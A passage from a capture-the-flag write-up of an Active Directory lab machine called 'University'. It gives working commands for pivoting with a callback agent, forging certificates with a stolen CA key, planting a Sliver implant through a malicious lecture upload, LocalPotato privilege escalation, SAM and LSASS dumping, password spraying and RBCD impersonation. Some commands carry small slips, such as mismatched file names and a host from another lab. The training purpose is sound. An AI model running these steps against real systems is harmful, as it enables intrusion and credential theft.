+ The `HELP DESK` group has three additional members. Mark them as **high-value** targets for future privilege escalation.

    ![](https://cdn-images-1.medium.com/max/1000/1*gert_uQliel5OOicRmHoQA.png)

+ Additionally, BloodHound shows multiple **domain-joined machines**, including workstations and lab systems.

    Using this query `MATCH (c:Computer) RETURN c` or just viewing `DOMAIN COMPUTERS` group members 
    ![](https://cdn-images-1.medium.com/max/1000/1*8I8KhDcBep79mNEn8t9j9Q.png)

    These are all enabled and active, suggesting an internal network beyond the current DC. We should enumerate network interfaces and explore potential lateral movement paths.
    
    ![](https://cdn-images-1.medium.com/max/1000/1*l8DlVbthDY3XUN7ugAUGZg.png)
#### Creating a User List from BloodHound Data


1. Unzip the collected BloodHound data.
2. Extract usernames from the *users.json file:
    ```bash
    cat *users.json | jq '.data[].Properties | select(.samaccountname) | "\(.samaccountname)"' -r > users.txt
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*-Tu6MwJabU9-7E8m5Pa7gw.png)

### Internal Network  

While inspecting the network interfaces using `ifconfig`, you will notice an additional internal network interface
![](https://cdn-images-1.medium.com/max/1000/1*QOaPs9ku8kdL_E74SD7Zaw.png)

To discover other hosts in the internal subnet, we can use a PowerShell one-liner to ping each IP in the `192.168.99.0/24` range
```powershell
1..254 | % { if (ping.exe -n 1 -w 200 192.168.99.$_ | Select-String "Reply") { "Reply from 192.168.99.$_" } }
```
From the results, Three active hosts was identified
+ `192.168.99.1` likely the gateway.
+ Two additional hosts, one being our current DC host, and the other likely our next target.

    ![](https://cdn-images-1.medium.com/max/1000/1*fUPdu4h4SMLUqvqXg1slqA.png)

To further enumerate, we checked the **ARP cache** using `arp -a`, which revealed DNS A (Host) record of previously communicated hosts, including the next target

![](https://cdn-images-1.medium.com/max/1000/1*kN9YPIrNaV-GgDRq_Pef_g.png)

### Pivoting using `Ligolo-ng`

Using Ligolo-ng we need [Linux Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz) and [Windows Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip)

1. start the Proxy
    ```bash
    ./proxy -selfcert -laddr 0.0.0.0:443
    ```
2. Upload the windows agent 
    ```
    certutil -urlcache -split -f http://IP/agent.exe    
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*zntDNXr2jpJdhCWbCKu2Gw.png)
3. Start our agent to connect back to pur proxy

    Using `-retry` Ensures that the agent will keep attempting to reconnect if the connection drops or if the listener is temporarily unavailable. This improves reliability, especially in unstable environments.

    ```bash
    .\agent.exe -ignore-cert -connect 10.10.16.39:443 -retry
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*ycBEQ0JH6jgpFPP-5dYlFQ.png)
4. Setting Up the Tunnel Interface


    To establish a tunnel for routing traffic to the internal network, we create a virtual interface. This step is crucial after pivoting to a compromised host using Ligolo, enabling access to the internal subnet. This allows us to route our traffic to the target's internal network via the Ligolo tunnel directly from terminal without setting up any proxychains.

    ```bash
    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
    sudo ip route add 192.168.99.0/24 dev ligolo
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*1zrk0Q7HKCteCy9dDf8ClA.png)
5. Start tunnel
    ```bash
    session
    [enter]
    start
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*X3q-pJmL5sUSYF67aYjl1Q.png)

6. Check internal connection 

    We can test connection anyway but i would use nxc with the previously gained credentials to test the whole subnet
    ```bash
    nxc winrm 192.168.99.0/24 -u wao -p WebAO1337
    ```
    
    ![](https://cdn-images-1.medium.com/max/1000/1*DPxwPE2PmhE9Zw1ZdtcO2Q.png)

    I was wrong 192.168.99.1 is the current DC machine not the gateway. And the next target is **192.168.99.2** machine `ws-3` which we have access to it via winrm using `wao`'s user credentials

    ```bash
    nxc_bruter -i 192.168.99.12 -s all -u wao -p WebAO1337
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*9OAAVqyNUtA4kXfNScO2FA.png)
    For the third host nothing obvious yet but it has ssh port open even the version is unknown
--- 
## 4. Post Compromise Enumeration 

At this stage, since we have access to multiple machines, we should enumerate each one thoroughly to gather additional intelligence and determine the most effective path for the next stage of the attack.

### 192.168.99.1 DC

This is the local IP of the second network interface on our currently compromised machine. We previously enumerated this host when we first gained access via the earlier web exploit.

### 192.168.99.2 ws-3

1.  Testing Connection

    We can access this host via WinRM
    ```bash
    nxc winrm 192.168.99.2 -u wao -p WebAO1337
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*oYhpAosBx3RRyyVBCGoKcg.png)

2. Connecting
    ```bash
    evil-winrm -i 192.168.99.2 -u wao -p WebAO1337
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*YEUwdccLsCB8k3AS9wNTQQ.png)

3. Enumeration 
    
    After thorough enumeration, no interesting files even open local ports or additional network interfaces were found. However, two notable findings emerged

    + Automation Scripts Directory

        **Path:** `C:\Program Files\Automation-scripts\`
        
        This directory contains two notable files:

        
        ![](https://cdn-images-1.medium.com/max/1000/1*6PcZuVPKTKoKHKEQ2YfKjQ.png)
        
        As `BUILTIN\Users`, we have only **Read & Execute (RX)** permissions on the directory, while individual files inside have even more restrictive ACLs, preventing us from reading them directly.

        **Based on the filenames:**

        + `get-lectures.ps1` Likely a PowerShell script used to retrieve course content from a system or file share, potentially running as a scheduled task or service under a privileged account. Considering the web app allows professors to **upload lectures** there may be an opportunity to perform a malicious upload that this script processes, leading to code execution under the script owner’s context.

        + `wpad-cache-cleaner.ps1` – Related to Web Proxy Auto-Discovery (WPAD), which could be abused for NTLM relay attacks or to capture NTLM hashes.

    + `README.txt` on User Desktop
        ```powershell
        type C:\Users\wao\Desktop\README.txt
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*eQ_acvRyl4mUqQ8A7wgCOg.png)
        
        The note found on the target indicates that WS-1, WS-2, and WS-3 have not received updates since 29/10/2023, meaning our current `WS-3` host may be running outdated and potentially vulnerable software or configurations. This lack of patching could make it susceptible to known privilege escalation exploits for local SYSTEM access, as well as other vulnerabilities released after that date, making it a prime target for further enumeration and exploitation in the next stage.    

### 192.168.99.12 lab-2

+ Connection

    This host is a Linux machine with an open SSH port.
    For some reason — possibly intentional — the service is not always reachable; the port opens and closes intermittently.

    To automate connection attempts until it succeeds, I used the following one-liner (requires sshpass):

    ```bash
    sudo apt install sshpass
    while true; do sshpass -p 'WebAO1337' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 wao@192.168.99.12 && break; echo "[-] Retry..."; sleep 2; done
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*ZbntmROmYBlWuS_a9vfO6g.png)
    As shown above, sometimes it connects immediately, while other times it takes multiple retries.
    ![](https://cdn-images-1.medium.com/max/1000/1*zfLA6DosGWeE5rm1VlxkFA.png)
    The intermittent "banner exchange: invalid format" error pointed to an SSH handshake issue.
   
+ Checking the error cause

    Upon gaining access, inspecting `/etc/ssh/sshd_config` revealed a Banner directive pointing to `/etc/ssh/banner.txt`, which contained plain text.
    This caused the SSH client to receive non-protocol data before the handshake, triggering the error.

    ![](https://cdn-images-1.medium.com/max/1000/1*xdGyVxJWwkAFpIPPpMczvg.png)
    
    In a normal SSH connection, the first data from the server is the SSH protocol banner (`e.g., SSH-2.0-OpenSSH_7.6p1)`. Any additional content (ASCII art, warnings, or misconfigured scripts) sent before that will cause this type of error.

+ Privilege hint

    Once connected, the SSH login banner included a useful hint — all “Web Developers” are sudo users.
    Since wao is part of the web developers group, we already have root privileges here `sudo su`.
    ![](https://cdn-images-1.medium.com/max/1000/1*GJ2EndslepHGajHlcR5wjQ.png)

+ File enumeration & recon


    This machine hosts a full test deployment of the website.
    ![](https://cdn-images-1.medium.com/max/1000/1*U0yWSVb8MY9JEbr126nCxw.png)
    
    To review all file names `ls -laR`

    For local review, you can download the entire Downloads directory:

    1. On lab-2
        ```bash
        tar -cvf downloads.tar Downloads/
        split -b 10M downloads.tar downloads.tar.part-
        ```
    2. On attack machine
        ```bash
        scp wao@192.168.99.12:/home/wao/downloads.tar.part-aa .
        scp wao@192.168.99.12:/home/wao/downloads.tar.part-ab .
        scp wao@192.168.99.12:/home/wao/downloads.tar.part-ac .
        ```
    3. Recombine & extract
        ```bash
        cat downloads.tar.part-* > downloads_recombined.tar
        tar -xvf downloads_recombined.tar
        ```
    4. Interesting paths found:
        ```bash
        cat ./Downloads/nginx/nginx.conf
        cat ./Downloads/test/settings.py
        cat ./Downloads/University-Windows/University/settings.py
            ./Downloads/University-Linux/University/static/assets/uploads/CSRs/2.csr
            ./Downloads/University-Linux/University/static/assets/uploads/Pub_KEYs/2.asc
        cat ./Downloads/University-Linux/University/templates/debug-static/assets/uploads/script.sh
        cat ./Downloads/University-Linux/University/templates/debug-static/assets/uploads/script_3MIgYxC.sh
        ```
        Most of these had been retrieved earlier, but this instance included another CSR file: `2.csr`.

        ![](https://cdn-images-1.medium.com/max/1000/1*klfxsu-XzsIJx3HZFCJt5Q.png)

        Additionally, the database password `W3lc0meT0TheH3ll!` was present in one of the settings files, though we had already dumped the production DB.

        ![](https://cdn-images-1.medium.com/max/1000/1*ZwzEd4TrWwaFGtoc4no0tg.png)

+ Inspecting the new csr file


    The new CSR appears to belong to another professor, but since we already have professor-level access, it’s time to pivot — by abusing the “upload lecture” feature to plant a malicious file that will be picked up by the automated script, gaining code execution under the script’s execution context.

    ![](https://cdn-images-1.medium.com/max/1000/1*tt6rOgICwN2CMX-GreauZA.png)

---

## 5. Post Compromise exploitation

### Abusing Certificate realted files

Since we have access to the CA's private key (rootCA.key) and certificate, we can issue valid client certificates without needing the web application's approval process. There are two main approaches:

+ Generate our own CSR impersonating a professor (by setting the Common Name and email to match their account), then self-sign it using the CA key. This allows immediate access as a professor without submitting the CSR to the website.

+ Use an existing CSR found in the `uploads/CSRs` directory. If it belongs to a high-privileged user (e.g., a professor), we can sign it using the CA key and log in with the resulting certificate, as we match the user's identity exactly.

To determine which CSR belongs to a professor, we inspect each with OpenSSL
```bash
openssl req -in 5.csr -noout -subject
openssl req -in 7.csr -noout -subject
```
![](https://cdn-images-1.medium.com/max/1000/1*i5VzMbpTWcTpE3zUZMhRFg.png)

From the University_customuser table, we know **martin.rose** is a professor and **steven** is a student. so we use 5.csr. We sign it using the university’s CA:

```bash
openssl x509 -req -in 5.csr  -CA CA/rootCA.crt -CAkey CA/rootCA.key -CAcreateserial -out 5.crt
```
![](https://cdn-images-1.medium.com/max/1000/1*4DuZMmVpPCKUKlCfVDabkQ.png)

After signing in at [SDC](http://university.htb/accounts/login/SDC/) with the certificate.

![](https://cdn-images-1.medium.com/max/1000/1*JvMb8Ru-KCq4AFePzNcXTA.png)

A new feature appears for this account, We can now  **Create a New Course**.

![](https://cdn-images-1.medium.com/max/1000/1*nR4ytD8oHO4dbxsERKT8JA.png)

Clicking it leads to the `request_cert` endpoint with an error stating a Professor-Signed-Certificate Cookie is required.


![](https://cdn-images-1.medium.com/max/1000/1*b2H7a3UeYPaodu4L9TsyfQ.png)

I don't know what is the problem, But since we control the user profile, we can submit the CSR through the web interface and receive the new `signed-cert.pem`. This PEM file contains the signed certificate. Logging in again with this new certificate grants full access to course creation.

After signing out, we can log back in using the downloaded signed-cert.pem file, which now grants access to the Create a New Course functionality.

![](https://cdn-images-1.medium.com/max/1000/1*9IbBoRc83uNS0uO5p8OiDw.png)
_http://university.htb/course/create/_

### Creating a new course 

Navigate to [Create a new courses](university.htb/course/create/) Fill the fields and click submit.

![](https://cdn-images-1.medium.com/max/1000/1*GVJVBdFEShjKLdNLo_XJWw.png)

The page provides instructions for uploading a new lecture.

![](https://cdn-images-1.medium.com/max/1000/1*_ahUH9afALVeWwTYyCYQ1A.png)

We’re required to upload a `.zip` file that must be signed. Inside the `.zip`, there can be a .`url` file. As we know from before there is a script used to retrieve uploaded lecture content. If this `.url` points to a malicious shellcode, and the server has this automated process that monitors or processes these lecture files (like `get-lectures.ps1`), we might be able to gain code execution.


Since signing is mandatory, we first need to upload our public signing key via the [Change Public Key](http://university.htb/accounts/upload_PubKEY/).

![](https://cdn-images-1.medium.com/max/1000/1*I2G35ExrCt_xG69wDZ0vTw.png)

#### Create signing key using gpg

1. Generate the key pair
    ```bash
    gpg --gen-key
    ```
    When prompted:
    + **Name:** `Martin`
    + **Email:** `martin.rose@hotmail.com`
    + **Password:** Use any password (make sure to remember it for later).

        ![](https://cdn-images-1.medium.com/max/1000/1*16IRusOkO-_DQVfVXwEXKA.png)

2. Export the public key
    ```bash
    gpg --export -a "Martin" > martin.rose.asc
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*1Nd4WvmTK4zbxWUNGYFFoQ.png)
3. Upload the public key
    Submit `martin.rose.asc` on the `Change Public Key` page so the site can verify the integrity of any lecture you upload later.
4. Sign the lecture archive
    ```bash
    gpg --detach-sign -u Martin lecture.zip 
    ```
#### Preparing the Lecture Payload

1. Review an existing lecture
    You can start by downloading one of the already uploaded course lectures to review its structure and contents. Inspect its .url files.
    ![](https://cdn-images-1.medium.com/max/1000/1*LmR5l5U_mW8lygMAleLgOQ.png)  

2. Generate a Sliver Windows implant

    + Start the Sliver C2 server (if not already running): `sliver-server`
    + Generating an **mTLS-encrypted** Sliver Windows implant 

        `mTLS` (Mutual Transport Layer Security) is the secure communication protocol used by Sliver to establish encrypted communication between the implant (payload) and the C2 server.

        In this scenario, the monitoring script is running on WS-3. This means the shell will most likely connect back from that host. However, since WS-3 is on an internal network and has no direct connectivity to our attack machine, we must pivot through a pivot host 'middle machine'. This middle machine should have access to both the internal network and our Kali attack box. It will act as a port-forwarding proxy, relaying connections to us.
        
        **Network Architecture & Connection Flow**
        ```md 
        [Target/Victim] → [Pivot Host] → [Attack Machine]
        ```
        
        ![](https://cdn-images-1.medium.com/max/1000/0*Iah6iVeJnyBO1kvH)

        Generate the implant using the pivot host’s local IP:
        ```bash
        generate --mtls 192.168.99.1:6666 --os windows --arch amd64 --format exe --name sliver
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*xPWDblVFOSLti77oMnoJjQ.png)

        > **WARNING:** The Sliver implant is relatively large in size. You could alternatively use Metasploit, but I challenged myself to only use Sliver C2 for practice. As far as I know, the staged payload format we used earlier in this write-up does not support direct .exe output. You could generate C code and embed it into a loader, but that takes more time. If you have a faster method, [DM me](https://www.linkedin.com/in/zyad-abdelbary/).  
        {: .prompt-warning }

    + Start the mTLS Listener
        ```bash
        mtls -L 10.10.16.24 -l 6666
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*ZlMWsJmh5yHpG_PszynMBw.png)
        
        To view active listeners `jobs`

3. Reverse Port Forwarding with Ligolo-ng

    We use Ligolo-ng to forward the implant’s callback port from the internal pivot host to our Kali box.
    
    In the Ligolo-ng session

    ```bash
    listener_add --addr 192.168.99.1:6666 --to 10.10.16.24:6666
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*rUHc1WJtf_Iqi8Rd1GVnRQ.png)

    To list current port-forwarding rules `listener_list`

    ![](https://cdn-images-1.medium.com/max/1000/1*rUHc1WJtf_Iqi8Rd1GVnRQ.png)

4. Upload the Implant to `WS-3`
    
    Connect to `WS-3` via WinRM

    ```bash
    evil-winrm -i 192.168.99.2 -u wao -p WebAO1337 
    ```
    
    Place the implant in a globally accessible folder `C:\tmp` so that any user including the one executing the script can access it.

    If `C:\tmp` does not exist
    ```powershell
    mkdir C:\tmp; cd C:\tmp
    ```

    Then upload the implant **(note: large file, will take time)**

    ![](https://cdn-images-1.medium.com/max/1000/1*55p5NHLNuwf9ZGzsaUVZRg.png)

5. Create the Malicious `.url` File

    > **INFO:** A `.url` file is a Windows Internet Shortcut using an INI-style format, containing a `URL=` fild. When opened, it launches the target resource using the associated protocol handler. While typically used for **HTTP/HTTPS** links, the `URL=` field can also point to any registered URI scheme, such as `ftp://`, `file://`, `ldap://`, `ms-msdt:`, or custom protocol handlers.
    {: .prompt-info }
    
    After testing multiple protocols, only `file://` worked reliably. (**Note:** many failed tests were on the AU VPN; switching to the US VPN resolved the issue. It's possible the AU VPN’s machine was corrupted, so I can’t confirm whether other protocols might have worked there.)

    + Creat the file
        ```ini
        [InternetShortcut]
        URL=file:C:\\tmp\\sliver.exe    
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*g96MMwPLIv7Q1bxPSXeqbQ.png)

    + Compress it
        ```bash
        zip lecture.zip ./lecture.url
        ```

    ![](https://cdn-images-1.medium.com/max/1000/1*9rrjCBB1IOPTnGPvc7QQ_w.png)

6. Sign the Archive 

    Use the previously generated GPG keypair (martin.rose) to sign the lecture zip file:

     ```bash
    gpg -u martin.rose --detach-sign ./lecture.zip
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*IUD4Kdje3H-if6HBJvPEVQ.png)

7. Upload the New Lecture

    ![](https://cdn-images-1.medium.com/max/1000/1*WhZc3JEpLytKPE1OxzbgZw.png)

8. Wait for the Callback

    After a few minutes, you should receive the callback in Sliver C2
    ![](https://cdn-images-1.medium.com/max/1000/1*vrA37pF37Qly-_Ly3salVg.png)

    + Tp view active sessions
        ```bash
        sessions
        ```
    + Interact with a session
        ```bash
        use <session_id>
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*dmOJ8zPRWkQU2LFAzcHSsQ.png)
    + Quickly gather system and user info using `info`
        ![](https://cdn-images-1.medium.com/max/1000/1*vevFtK58PtIhEE4rEsQ4PQ.png)
    + Spawn interactive normal PS shell using `shell`


We successfully obtained the user flag.
![](https://cdn-images-1.medium.com/max/1000/1*iZh0Xu500lb5cfbVqltPCw.png)

---

## 6. Local Privilege Escalation to Administrator

The user account we gained access to, `MARTIN.T`, is a member of the `CONTENT EVALUATORS` group. Since we obtained this access by uploading a malicious lecture, this user also has permissions to run the `get-lectures.ps1` script.

![](https://cdn-images-1.medium.com/max/1000/1*j6uKnz4WcJ2iZVjkda2iFQ.png)


```powershell
$DC_IP =$(Get-DnsClientServerAddress -AddressFamily IPv4 -InterfaceIndex 8).ServerAddresses
$lectures = $(curl "http://university.htb/api/get_verified_uploaded_lectures/" -Proxy $("http://"+$DC_IP)).content
$lectures_list = $lectures -split "`n"
for ($i= 0; $i -lt ($lectures_list.Count-1); $i++ ){
    $lec_path = "\\"+$DC_IP+"\Lectures\"+$lectures_list[$i]
    cp $lec_path C:\Users\Public\Lectures\
}
$files_list = Get-ChildItem -Path C:\Users\Public\Lectures\ -Filter "*.zip" -File
foreach ($file in $files_list) {
     $mimetype = ((& 'C:\Program Files\Trid\trid.exe' -n:1 $file.FullName) -split "`n")[-1]
     if ($mimetype -match "ZIP compressed archive"){
         rm ~\Desktop\Lecture -Recurse
         Expand-Archive -Path $file.FullName -DestinationPath ~\Desktop\Lecture
         $url_files_list = Get-ChildItem -Path ~\Desktop\Lecture -Filter "*.url" -File
         foreach ($url_file in $url_files_list) {
             
             $url_file_mimetype = ((& 'C:\Program Files\Trid\trid.exe' -n:1 $url_file.FullName) -split "`n")[-1]
             if ($url_file_mimetype -match "Windows URL shortcut"){
                 start $url_file.FullName
             }
         }
     }
     rm $file.FullName
}

Get-ChildItem ~\Desktop\Lecture | Remove-Item -Recurse -Force
```
The get-lectures.ps1 script is an automated lecture retrieval and processing tool. It:
Fetches a list of verified uploaded lectures from university.htb.

1. Downloads .zip lecture packages from the DC.

2. Extracts their contents.

3. Searches for .url (Windows Internet Shortcut) files.

4. Automatically opens them if detected.

This presents a dangerous attack vector — as we’ve already exploited earlier — because .url files can point to malicious payloads and be executed automatically by the script.

![](https://cdn-images-1.medium.com/max/1000/1*b3m3k7LPKPNfMV1c5VN5Dg.png)

While enumerating the host `WS-3` with current user privilage, we once again found a desktop note hinting that the system may be running outdated and potentially vulnerable configurations:

![](https://cdn-images-1.medium.com/max/1000/1*TVcA_HH5Rn7qoN345pW6sg.png)

To confirm this, we can check the last installed Windows updates using

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
![](https://cdn-images-1.medium.com/max/1000/1*MKstiL_NGnlzknsVKiiaew.png)

### Analysis of Installed Patches

**Installed Hotfixes:**
+ KB5020627
+ KB5019966
+ KB5020374

All installed on: **November 5, 2022**

This means the machine has not been updated since November 5, 2022. Which is a strong indication that any LPE vulnerability disclosed after that date may still be exploitable.

By reviewing the [Security Update Guide](https://msrc.microsoft.com/update-guide) and filtering for high-severity local privilege escalation vulnerabilities after this date, you can identify multiple candidates. I used ChatGPT to filter them and give me the most severe vulnerabilities for LPE.


![](https://cdn-images-1.medium.com/max/1000/1*-U506j_PvG0LH4bDj4z8ZQ.png)


![](https://cdn-images-1.medium.com/max/1000/1*8NwBHhV_hBg617_yLEcxjA.png)

After testing several exploits, `CVE-2023-21746` also known as LocalPotato proved to be successful for escalating privileges from a normal user to SYSTEM.

### CVE‑2023‑21746 – LocalPotato

This vulnerability allows low-privileged users to read or write arbitrary files with `SYSTEM` privileges. While it doesn’t directly spawn an elevated process, it can be chained with other file-execution techniques to achieve full SYSTEM-level code execution. LocalPotato affects all supported Windows versions prior to the January 2023 patch.

It is essentially a Windows NTLM relay vulnerability that enables a low-privileged local user to trick privileged services into authenticating to them, then relay that authentication to gain SYSTEM privileges.


#### **How it works (in short):**

+ **Abuse Windows NTLM over local RPC** exploiting a design flaw in how authenticated RPC endpoints operate.

+ Force a privileged service such as `NT AUTHORITY\SYSTEM` to connect to your controlled listener.

+ Relay the captured NTLM authentication to another local service that permits elevated operations.

+ End up executing code as SYSTEM.

It can be thought of as a local version of PetitPotam or PrinterBug-style NTLM relays, but designed for privilege escalation on the same host.

```md
Low-privileged user → trigger RPC/NTLM auth from SYSTEM service → capture & relay NTLM → privileged service accepting it → execute code as SYSTEM
```

![](https://cdn-images-1.medium.com/max/1000/0*bkJ8wTnKC2tBLVIu)

While there are many technical details behind the exploit (as shown in the diagram above), an in-depth understanding isn’t strictly necessary here, since a fully working proof-of-concept is already available: [LocalPotato](https://github.com/decoder-it/LocalPotato). You can download a precompiled version from [this release.](https://github.com/decoder-it/LocalPotato/releases/download/v1.1/LocalPotato.zip)

After uploading it to the target host, run it to display the help menu:

![](https://cdn-images-1.medium.com/max/1000/1*9_iTsd2Z7AK0C98ep50bOA.png)

There are varity of options here we can usesuch as DLL injection. However, since this is the main Domain Controller, replacing system DLLs directly is too risky — a corrupt DLL path or system file replacement could disrupt core services.

From earlier enumeration, we know about the automation directory containing two PowerShell scripts:

+ `get-lectures.ps1` already exploited to review lecture content and gain access to the current user.
+  `wpad-cache-cleaner.ps1` related to Web Proxy Auto-Discovery (WPAD). This script is inaccessible with our current privileges, implying it runs with higher permissions. We also know these scripts are executed automatically at scheduled intervals.

Since LocalPotato allows command execution as a high-privileged user, replacing the contents of `wpad-cache-cleaner.ps1` with a payload will result in it being executed automatically, granting us elevated access.

#### Exploitation

1. Prepare the exploit code 


    There are several ways to proceed here. For example, we could use the staged PowerShell loader we leveraged earlier, but that would require careful handling of port forwarding, listener configuration, and IP assignments for each command.

    Instead, I chose to use the **non-staged Sliver implant** (`sliver.exe`) we had previously deployed during the lecture upload exploit. Since it’s already uploaded and functioning, we don’t need to create a new payload. We simply need a PowerShell script that runs the executable, which will guarantee privileged access.

    Create `shell.ps1`: 
        ```powershell
        C:\tmp\sliver.exe
        ```
2. Upload this PowerShell file to `C:\tmp` on the WS-3
3. Upload the `LocalPotato` exploit binary to  `C:\tmp`
3. Execute the exploit
    ```powershell
    C:\tmp\LocalPotato.exe -i C:\tmp\shellff.ps1 -o "\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1"
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*k8ruzE8sEWsIGzvXgMQZTQ.png)

4. Wait for the callback

    Within a few minutes, you should receive a session callback with Administrator privileges.
    ![](https://cdn-images-1.medium.com/max/1000/1*B6mdRt0Y9JT3oSOwEm6vqQ.png)

### Internal scanning

![](https://cdn-images-1.medium.com/max/1000/1*EP5oPNuCtBLiJM9fTAkQ0Q.png)

we are now have **local Administrator** on the host. However, many high-impact privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege` are disabled. The `SeEnableDelegationPrivilege` is also disabled, meaning we can’t directly abuse token delegation.

That said, `SeImpersonatePrivilege` is **enabled**, which can be exploited for SYSTEM access if necessary.With token impersonation attacks using tools like `PrintSpoofer`, `RoguePotato`, or `GodPotato`, we could escalate to SYSTEM or other privileged accounts.

But our position still allows full local control including dumping **LSASS**, backing up and extracting the **SAM** and **SYSTEM** registry hives to obtain password hashes, and then moving into Active Directory enumeration to hunt for escalation paths. From here, focus on credential dumping and Kerberos-based attacks to pivot toward Domain Admin.

![](https://cdn-images-1.medium.com/max/1000/1*2Nw9uDduNtWr3DEcFAyOzg.png)

### Backing up SAM and SYSTEM Registry Hives 

As a member of the **Administrators** group, we can back up the SAM and SYSTEM hives for offline credential extraction.

+ **Dump the hives**

    ```cmd
    reg save hklm\sam C:\tmp\sam && reg save hklm\system C:\tmp\system && reg save hklm\security C:\tmp\security
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*y3GZjDcWIqP5I3yrCn3HNA.png)

+ Download the backup files from C:\tmp
+ Extract hashes with Impacket’s `secretsdump.py`
    ```bash
    secretsdump.py -sam sam -security security -system system LOCAL
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*RVFku_HZ1KamCyq22NMDsg.png)

    Here, we even have a `DefaultPassword` in clear text that we can use later for password spraying against the users we already have. We also have a local administrator hash, which can be abused in many ways.


### Dumping LSASS

It’s also worth dumping LSASS to check if a Domain Admin has recently logged in, leaving credentials in memory.

+ Dump LSASS memory using [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) from the SysInternals suite

```powershell 
C:\tmp\procdump.exe -accepteula -ma lsass.exe C:\tmp\lsass.dmp
```
![](https://cdn-images-1.medium.com/max/1000/1*b7NIsgcsac3c_Kv4bA7xxw.png)

+ Extract hashes with `pypykatz`

    ```bash
    pypykatz lsa minidump lsass.dmp
    ```

### Password Spraying

Since we have the default password, we can expect multiple successful logins.

```bash
nxc ldap 10.10.11.39 -u users.txt -p 'password' --continue-on-success 
```
![](https://cdn-images-1.medium.com/max/1000/1*b_Ss06SvagwxaqrH7EKK3A.png)

From this output, focus on identifying high-privilege accounts, especially those belonging to the Help Desk group we discovered earlier in BloodHound.

Some of these accounts also have WinRM access to the target machine

```bash
nxc winrm 10.10.11.39 -u users.txt -p 'password' --continue-on-success
```
![](https://cdn-images-1.medium.com/max/1000/1*0_rjrPCO0otieqgVnP-TdA.png)

Checking our BloodHound data we have now privilage users which could be used in domain escalation, Somw of our owned users members of the `Account Operators` and `Help Desk` Groups  

![](https://cdn-images-1.medium.com/max/1000/1*O6eJdvOxAt2kMuef6IFxOg.png)

### Read GMSA
Rose.L → Account Operators → can ReadGMSAPassword for `GMSA-PClient01$` → that account has AllowedToAct on the DC → use Resource-Based Constrained Delegation (RBCD) to impersonate any domain user (including DA) to the DC → full domain compromise.

In short:

+ We will use `Rose.L` creds to dump the GMSA password.

+ With `GMSA-PClient01$` creds, leverage the **AllowedToAct** permission for RBCD.

+ Request a TGS as any high-privilege user to the DC and execute commands.

GMSA Read

```bash
bloodyAD --host dc01.vintage.htb --domain "university.htb" --dc-ip 10.10.11.39 -u Rose.L -p 'v3ryS0l!dP@sswd#X' get object 'GMSA-PCLIENT01$' --attr msDS-ManagedPassword 
```
![](https://cdn-images-1.medium.com/max/1000/1*UYeC0WzAtHLr6pHK6zMXBQ.png)

### Impersonating Administrator

1. Request ticket as administrator
    ```bash
    impacket-getST -dc-ip 10.10.11.39 -spn http/dc.university.htb -hashes :6D364C74FF11B3BCE0BC41C097BF55C8 -impersonate Administrator university.htb/'GMSAPCLIENT01$'

    ```
2. Export the ticket to use
    ```bash
    KRB5CCNAME=Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
    ```
3. Authenticate as Administrator

    ```bash
    evil-winrm -i dc.university.htb -r university.htb 
    ```

---

## 7. Resources 

+ [Internet shortcuts and DLL highjacking TL; DR](https://www.dotsec.com/internet-shortcuts-and-dll-hijacking/)

+ [Shortcut To Malice: URL Files](https://inquest.net/blog/shortcut-to-malice-url-files/)

+ [LocalPotato - When Swapping The Context Leads You To SYSTEM](https://www.localpotato.com/localpotato_html/LocalPotato.html)

+ [LocalPotato – When Swapping The Context Leads You To SYSTEM](https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/)

